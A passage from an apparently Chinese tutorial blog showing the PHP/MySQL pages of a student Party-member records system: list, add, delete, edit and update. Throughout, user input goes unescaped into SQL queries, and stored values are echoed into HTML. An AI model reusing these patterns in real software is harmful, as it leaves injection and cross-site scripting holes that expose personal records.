class="title">mebID</span>=&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">mebID</span>&#x27;];?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">danger</span>&quot;&gt;修改&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> &#125;?&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span> <span class="title">btn</span>-<span class="title">block</span>&quot; <span class="title">href</span>=&quot;<span class="title">add</span>.<span class="title">php</span>&quot;&gt;添加学生信息&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php具有查询，修改，添加，删除功能</p>
<p>同时打印出数据库内容 link .php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$link</span> = <span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from memberInfo order by mebID asc&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$dataArr</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$dataArr</span> = <span class="title function_ invoke__">mysqli_fetch_all</span>(<span class="variable">$res</span>, MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="3删除功能实现-del-php"><a href="#3删除功能实现-del-php" class="headerlink" title="3删除功能实现 del.php"></a>3删除功能实现 del.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 1. 接收传递过来的id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mebID&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;&lt;h1&gt;连接数据库失败&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;mebID&#x27;</span>];</span><br><span class="line"><span class="comment">// 2. 连接数据库</span></span><br><span class="line"><span class="variable">$link</span> = <span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>,<span class="string">&quot;set names &#x27;utf8&#x27;;&quot;</span>);</span><br><span class="line"><span class="comment">// 3. 删除该条数据</span></span><br><span class="line"><span class="variable">$query</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>,<span class="string">&quot;delete from memberinfo where mebID = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="comment">// 4. 查询失败的处理</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$query</span>) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;&lt;h1&gt;查询数据失败&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 5. 受影响的行数</span></span><br><span class="line"><span class="variable">$affected_rows</span> = <span class="title function_ invoke__">mysqli_affected_rows</span>(<span class="variable">$link</span>);</span><br><span class="line"><span class="comment">// 6. 删除失败</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$affected_rows</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;&lt;h1&gt;删除失败&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-增加功能实现-add-php"><a href="#4-增加功能实现-add-php" class="headerlink" title="4 增加功能实现 add.php"></a>4 增加功能实现 add.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;cn&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;学生党员信息&lt;/title&gt;</span><br><span class="line">    &lt;!-- 加载 Bootstrap 的 CSS 文件 --&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/4.6.2/css/bootstrap.min.css&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 加载 jQuery JavaScript 文件 --&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 加载 Popper JavaScript 文件 --&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/popper.js/1.16.0/umd/popper.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 加载 Bootstrap 的 JavaScript 文件 --&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/4.6.2/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span> <span class="title">add</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h4</span> <span class="title">class</span>=&quot;<span class="title">alert</span> <span class="title">alert</span>-<span class="title">primary</span> <span class="title">text</span>-<span class="title">center</span>&quot;&gt;添加学生信息&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">action</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">_SERVER</span>[&#x27;<span class="title">PHP_SELF</span>&#x27;]; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span> <span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">id</span>&quot; <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">sm</span>-2 <span class="title">col</span>-<span class="title">form</span>-<span class="title">label</span>&quot;&gt;<span class="title">ID</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">sm</span>-10&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">id</span>=&quot;<span class="title">id</span>&quot; <span class="title">name</span>=&quot;<span class="title">id</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span> <span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">memID</span>&quot; <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">sm</span>-2 <span class="title">col</span>-<span class="title">form</span>-<span class="title">label</span>&quot;&gt;学号&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">sm</span>-10&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">id</span>=&quot;<span class="title">memID</span>&quot; <span class="title">name</span>=&quot;<span class="title">memID</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span> <span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">mebName</span>&quot; <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">sm</span>-2 <span class="title">col</span>-<span class="title">form</span>-<span class="title">label</span>&quot;&gt;姓名&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">sm</span>-10&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">name</span>=&quot;<span class="title">mebName</span>&quot; <span class="title">id</span>=&quot;<span class="title">mebName</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span> <span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">mebSex</span>&quot; <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">sm</span>-2 <span class="title">col</span>-<span class="title">form</span>-<span class="title">label</span>&quot;&gt;性别&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">sm</span>-10&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">id</span>=&quot;<span class="title">mebSex</span>&quot; <span class="title">name</span>=&quot;<span class="title">mebSex</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span> <span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">mebClass</span>&quot; <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">sm</span>-2 <span class="title">col</span>-<span class="title">form</span>-<span class="title">label</span>&quot;&gt;班级&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">sm</span>-10&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">id</span>=&quot;<span class="title">mebClass</span>&quot; <span class="title">name</span>=&quot;<span class="title">mebClass</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span> <span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">mebAddDate</span>&quot; <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">sm</span>-2 <span class="title">col</span>-<span class="title">form</span>-<span class="title">label</span>&quot;&gt;入党时间&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">sm</span>-10&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">id</span>=&quot;<span class="title">mebAddDate</span>&quot; <span class="title">name</span>=&quot;<span class="title">mebAddDate</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;!--这里添加提示--&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">if</span>(!<span class="title">empty</span>($<span class="title">GLOBALS</span>[&#x27;<span class="title">msg</span>&#x27;])): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">alert</span> <span class="title">alert</span>-<span class="title">warning</span>&quot; <span class="title">role</span>=&quot;<span class="title">alert</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">GLOBALS</span>[&#x27;<span class="title">msg</span>&#x27;]; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">endif</span> ?&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span> <span class="title">btn</span>-<span class="title">block</span>&quot;&gt;保存&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">// 1. 判断是否是<span class="title">post</span>提交</span></span><br><span class="line"><span class="class">// 2. 处理表单传递过来的数据（不能为空!<span class="title">empty</span>）</span></span><br><span class="line"><span class="class">// 3. 连接数据库并插入一条数据</span></span><br><span class="line"><span class="class">// 4. 开始查询（<span class="title">insert</span> <span class="title">into</span>）</span></span><br><span class="line"><span class="class">// 5. 判断是否查询成功</span></span><br><span class="line"><span class="class">// 6. 判断是否插入成功`<span class="title">mysqli_affected_rows</span>()`</span></span><br><span class="line"><span class="class">// 7. 重定向</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">function</span> <span class="title">add_user</span>()</span>&#123;</span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$memID</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;memID&#x27;</span>];</span><br><span class="line">    <span class="variable">$mebName</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;mebName&#x27;</span>];</span><br><span class="line">    <span class="variable">$mebSex</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;mebSex&#x27;</span>];</span><br><span class="line">    <span class="variable">$mebClass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;mebClass&#x27;</span>];</span><br><span class="line">    <span class="variable">$mebAddDate</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;mebAddDate&#x27;</span>];</span><br><span class="line">    <span class="variable">$link</span> = <span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>,<span class="string">&quot;set names &#x27;utf8&#x27;;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$link</span>)&#123;</span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;连接数据库失败&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$query</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>,<span class="string">&quot;INSERT INTO memberinfo VALUES (<span class="subst">&#123;$id&#125;</span>,&#x27;<span class="subst">&#123;$memID&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$mebName&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$mebSex&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$mebClass&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$mebAddDate&#125;</span>&#x27;);&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$query</span>) &#123;</span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;查询过程失败&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$affected</span> = <span class="title function_ invoke__">mysqli_affected_rows</span>(<span class="variable">$link</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$affected</span>!==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&#x27;error_message&#x27;</span>] = <span class="string">&#x27;添加数据失败&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]===<span class="string">&#x27;POST&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">add_user</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<h3 id="5修改功能实现"><a href="#5修改功能实现" class="headerlink" title="5修改功能实现"></a>5修改功能实现</h3><p>首先建立一个可以编辑的edit.php文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;cn&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line">    &lt;!-- 加载 Bootstrap 的 CSS 文件 --&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/4.6.2/css/bootstrap.min.css&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 加载 jQuery JavaScript 文件 --&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 加载 Popper JavaScript 文件 --&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/popper.js/1.16.0/umd/popper.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 加载 Bootstrap 的 JavaScript 文件 --&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/4.6.2/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mebID&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;&lt;h1&gt;必须传入指定参数&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;mebID&#x27;</span>];</span><br><span class="line"><span class="variable">$link</span> = <span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>,<span class="string">&quot;set names &#x27;utf8&#x27;;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$link</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;&lt;h1&gt;连接数据库失败&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$query</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>,<span class="string">&quot;select * from memberinfo where mebID = <span class="subst">&#123;$id&#125;</span> limit 1&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$query</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;&lt;h1&gt;查询数据失败&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$row</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;&lt;h1&gt;找不到你要编辑的数据&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h2 align=<span class="string">&quot;center&quot;</span>&gt;修改数据&lt;/h2&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;update.php?ID=&lt;?=<span class="subst">$row</span>[&#x27;mebID&#x27;]?&gt;&quot;</span>&gt;</span><br><span class="line">    &lt;table width=<span class="string">&quot;400&quot;</span> border=<span class="string">&quot;1&quot;</span> align=<span class="string">&quot;center&quot;</span> cellpadding=<span class="string">&quot;2&quot;</span>&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td width=<span class="string">&quot;125&quot;</span>&gt;学号&lt;/td&gt;</span><br><span class="line">            &lt;!-- 输入框，并设置默认值，即为记录的原值 --&gt;</span><br><span class="line">            &lt;td width=<span class="string">&quot;275&quot;</span>&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;mebID&quot;</span> value=<span class="string">&quot;&lt;?=<span class="subst">$row</span>[&#x27;mebID&#x27;]?&gt;&quot;</span>&gt; *&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;姓名&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;mebName&quot;</span> value=<span class="string">&quot;&lt;?=<span class="subst">$row</span>[&#x27;mebName&#x27;]?&gt;&quot;</span>&gt; *&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;性别&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;mebSex&quot;</span> value=<span class="string">&quot;&lt;?=<span class="subst">$row</span>[&#x27;mebSex&#x27;]?&gt;&quot;</span>&gt; *&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;班级&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;mebClass&quot;</span> value=<span class="string">&quot;&lt;?=<span class="subst">$row</span>[&#x27;mebClass&#x27;]?&gt;&quot;</span>&gt; *&lt;/td&gt;</span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;入党时间&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;mebAddDate&quot;</span> value=<span class="string">&quot;&lt;?=<span class="subst">$row</span>[&#x27;mebAddDate&#x27;]?&gt;&quot;</span>&gt; *&lt;/td&gt;</span><br><span class="line">            &lt;/td&gt;</span><br><span class="line"></span><br><span class="line">            &lt;td&gt;&amp;nbsp;&lt;/td&gt;</span><br><span class="line">            &lt;button type=<span class="string">&quot;submit&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span> <span class="title">btn</span>-<span class="title">block</span>&quot;&gt;确定&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>



<p>重定向到updata.php进行更新</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$link</span> = <span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="variable">$ID</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ID&#x27;</span>];</span><br><span class="line"><span class="variable">$mebID</span> = (<span class="variable">$_POST</span>[<span class="string">&#x27;mebID&#x27;</span>]);<span class="comment">//获取记录id</span></span><br><span class="line"><span class="variable">$mebName</span> = <span class="variable">$_POST</span>[<span class="string">&quot;mebName&quot;</span>]; <span class="comment">//获取表单中的数据</span></span><br><span class="line"><span class="variable">$mebSex</span> = <span class="variable">$_POST</span>[<span class="string">&quot;mebSex&quot;</span>];</span><br><span class="line"><span class="variable">$mebClass</span> = <span class="variable">$_POST</span>[<span class="string">&quot;mebClass&quot;</span>];</span><br><span class="line"><span class="variable">$mebAddDate</span> = <span class="variable">$_POST</span>[<span class="string">&quot;mebAddDate&quot;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;Update memberinfo Set mebID=&#x27;<span class="subst">$mebID</span>&#x27;,mebName=&#x27;<span class="subst">$mebName</span>&#x27;,mebSex=&#x27;<span class="subst">$mebSex</span>&#x27;,mebClass=&#x27;<span class="subst">$mebClass</span>&#x27;,mebAddDate=&#x27;<span class="subst">$mebAddDate</span>&#x27; Where mebID=&#x27;<span class="subst">$ID</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;执行失败&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;修改成功！&#x27;);location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





